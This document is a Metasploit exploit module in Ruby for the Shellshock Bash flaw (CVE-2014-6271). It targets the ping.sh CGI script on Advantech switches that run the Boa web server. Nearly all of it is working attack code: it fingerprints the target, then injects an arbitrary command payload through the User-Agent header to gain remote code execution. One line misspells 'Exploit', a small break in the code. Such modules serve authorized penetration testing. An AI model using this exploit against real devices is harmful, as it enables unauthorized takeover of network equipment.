# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Advantech Switch Bash Environment Variable Code Injection (Shellshock)&#039;,
      &#039;Description&#039; => %q{
        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
        handles external environment variables. This module targets the &#039;ping.sh&#039; CGI
        script, acessible through the Boa web server on Advantech switches. This module
        was tested against firmware version 1322_D1.98.
      },
      &#039;Author&#039; => &#039;hdm&#039;,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-6271&#039;],
        [&#039;CWE&#039;, &#039;94&#039;],
        [&#039;OSVDB&#039;, &#039;112004&#039;],
        [&#039;EDB&#039;, &#039;34765&#039;],
        [&#039;URL&#039;, &#039;https://community.rapid7.com/community/infosec/blog/2015/12/01/r7-2015-25-advantech-eki-multiple-known-vulnerabilities&#039;],
        [&#039;URL&#039;, &#039;https://access.redhat.com/articles/1200223&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q3/649&#039;]
      ],
      &#039;Privileged&#039; => false,
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Payload&#039; =>
        {
          &#039;Space&#039; => 1024,
          &#039;BadChars&#039; => "\x00\x0A\x0D",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039; =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;openssl generic&#039;
            }
        },
      &#039;Targets&#039; =>  [[ &#039;Automatic Targeting&#039;, { &#039;auto&#039; => true } ]],
      &#039;DefaultTarget&#039; => 0,
      &#039;License&#039; => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;Dec 01 2015&#039;
    ))
    register_options([
      Opt::RPORT(80)
    ], self.class)
  end

  #
  # CVE-2014-6271
  #
  def cve_2014_6271(cmd)
    %{() { :;}; $(#{cmd}) & }
  end

  #
  # Check credentials
  #
  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/cgi-bin/ping.sh&#039;
    )
    if !res
      vprint_error("#{peer} - No response from host")
      return Exploit::CheckCode::Unknown
    elsif res.headers[&#039;Server&#039;] =~ /Boa\/(.*)/
      vprint_status("#{peer} - Found Boa version #{$1}")
    else
      print_status("#{peer} - Target is not a Boa web server")
      return Exploit::CheckCode::Safe
    end

    if res.body.to_s.index(&#039;127.0.0.1 ping statistics&#039;)
      return  Exploit::CheckCode::Detected
    else
      vprint_error("#{peer} - Target does not appear to be an Advantech switch")
      return Expoit::CheckCode::Safe
    end
  end

  #
  # Exploit
  #
  def exploit
    cmd = cve_2014_6271(payload.encoded)
    vprint_status("#{peer} - Trying to run command &#039;#{cmd}&#039;")
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/cgi-bin/ping.sh&#039;,
      &#039;agent&#039;  => cmd
    )
  end

end

